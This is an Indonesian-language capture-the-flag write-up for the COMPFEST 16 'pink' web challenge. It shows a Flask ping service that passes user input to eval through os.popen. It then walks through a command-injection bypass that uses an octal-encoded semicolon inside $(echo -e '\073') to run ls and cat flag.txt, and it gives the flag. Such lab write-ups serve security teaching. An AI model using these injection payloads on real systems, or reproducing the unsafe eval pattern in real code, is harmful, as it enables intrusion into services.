# [500 pts] pink
### Category: Web Exploitation

**Deskripsi:**
> Ping your favorite IP!  
>   
> Author: k3ng  
> 
> http://challenges.ctf.compfest.id:20001

**main.py:**
```python
from flask import Flask, render_template, request
import os
import re

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "GET":
        return render_template("index.html")
    elif request.method == "POST":
        ip = request.form.get("ip")

        if re.match(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", ip) and not any(char in ip for char in [";", "|", "&", "/" "{", "}"]):
            cmd = "eval \"ping -c 4 " + ip + "\""or
            result = os.popen(cmd).read()
            return render_template("index.html", **{"data": result})
        else:
            return render_template("index.html", **{"data": "NO HACKING ALLOWED!!!! >:("})


if __name__ == "__main__":
    app.run("0.0.0.0", port=8080)
```

### Solusi:

Berdasarkan source code, website akan mengambil input yang di asumsikan sebagai suatu ip address yang akan di ping menggunakan command yang setara dengan:
```bash
eval "ping -c 4 $(ip)"
```

OS yang digunakan disini dapat diasumsikan sebagai linux karena options yang digunakan pada command 'ping' yaitu '-c'.

Pada website, input akan di filter sehingga hanya akan dianggap valid jika:  
1.) diawali dengan alamat ip address valid, dan  
2.) tidak mengandung karakter (";", "|", "&", "/" "{", "}")

Untuk meng-bypass filter dapat langsung saja dilakukan command substitution dengan menggunakan $().

Misal, target kita adalah untuk menghasilkan command:
```bash
eval "ping -c 4 0.0.0.0 ; ls"
```

Untuk meng-bypass filter karakter ';' , dapat digunakan command substitution dengan:
```bash
$(echo -e '\073')
```
**Note:** \073 adalah representasi oktal dari ';' , sedangkan opsi '-e' perlu ditulis agar bisa menghasilkan karakter dari escape sequence '\\'.

Sehingga command untuk menginjeksi 'ls' pada website akan terlihat seperti ini:
```bash
eval "ping -c 4 0.0.0.0 $(echo -e '\073') ls"
```

Karena user input hanya mempengaruhi parameter 'ip', maka untuk mendapat command tersebut hanya kita input:
```bash
0.0.0.0 $(echo -e '\073') ls
```

Hasil:

![pink](https://github.com/FieryBanana101/COMPFEST-16_TeamBaruBelajarCTF/blob/main/asset/Screenshot%202024-08-20%20232535.png)

Terlihat terdapat file 'flag.txt', langkah terakhir yaitu tinggal mengganti command 'ls' menjadi 'cat flag.txt'.
```bash
0.0.0.0 $(echo -e '\073') cat flag.txt
```

Kemudian akan didapatkan flag.

![flag](https://github.com/FieryBanana101/COMPFEST-16_TeamBaruBelajarCTF/blob/main/asset/Screenshot%202024-08-20%20232838.png)

> Flag: **COMPFEST16{bj1rrr_1njEKs1_p3rInTAH_96530087aa}**
